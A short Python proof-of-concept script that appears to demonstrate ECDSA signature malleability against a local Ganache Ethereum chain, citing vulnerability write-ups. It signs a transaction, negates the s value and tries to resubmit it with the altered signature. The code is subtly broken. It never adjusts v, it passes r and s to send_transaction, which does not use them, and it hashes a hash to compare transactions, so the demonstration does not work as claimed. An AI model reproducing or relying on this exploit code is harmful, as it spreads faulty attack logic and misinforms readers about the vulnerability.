#!/usr/bin/python3
from web3 import Web3, Account
from dotenv import load_dotenv
from ecdsa.curves import SECP256k1
import os

load_dotenv()

#* https://en.wikipedia.org/wiki/Transaction_malleability_problem#:~:text=The%20transaction%20malleability%20problem%20is,to%20identify%20a%20cryptocurrency%20transaction.

#* https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/signature-malleability.md
#* https://cryptogennepal.com/blog/signature-malleability-vulnerabilities-in-smart-contracts/

def main():
	#? connect to local chain
	#os.system("ganache-cli &")
	w3 = Web3(Web3.HTTPProvider("HTTP://127.0.0.1:7545"))

	#print(dir(w3.eth))

	#* account info from ganache
	private_key = os.environ.get("PRIVATE_KEY")
	account = Account.from_key(private_key)
	attacker = Account.from_key(os.environ.get("ATTACKER"))
	#print(dir(account))
	#exit()

	value = w3.to_wei(1, "ether")
	gas_price = w3.to_wei(50, "gwei")
	gas_limit = 29000
	nonce = w3.eth.get_transaction_count(account.address)
	data = "0xabcd"

	#? create a tx
	transcation = {
		"to": "0x96121C2c7f7a28af9105107C61E9f16d2F586585",
		"value": value,
		"gas": gas_limit,
		"gasPrice": gas_price,
		"data": data,
		"nonce": nonce
	}

	#? sign the tx
	account = Account.from_key(private_key)
	signed_transaction = account.sign_transaction(transcation)

	# Extract the v, r, and s values from the signature
	v = signed_transaction["v"]
	r = signed_transaction["r"]
	s = signed_transaction["s"]

	# Create a new signature with the same r value and a modified s value
	n = SECP256k1.order
	s_new = (n - s) % n
	signature = (r, s_new)

	transcation = {
		"to": "0x96121C2c7f7a28af9105107C61E9f16d2F586585",
		"from": account.address,
		"value": value,
		"gas": gas_limit,
		"gasPrice": gas_price,
		"data": data,
		"nonce": nonce,
	}

	# Create a new transaction with the same hash but a modified s value
	transcation["r"] = signature[0]
	transcation["s"] = signature[1]
	new_transaction_hash = w3.eth.send_transaction(transcation)

	# Compare the hashes of the original and modified transactions
	original_transaction_hash = w3.to_hex(w3.keccak(signed_transaction.rawTransaction))
	modified_transaction_hash = w3.to_hex(w3.keccak(w3.eth.get_transaction(new_transaction_hash)["hash"]))

	print(f"Original transaction hash: {original_transaction_hash}")
	print(f"Modified transaction hash: {modified_transaction_hash}")



if __name__ == "__main__":
	main()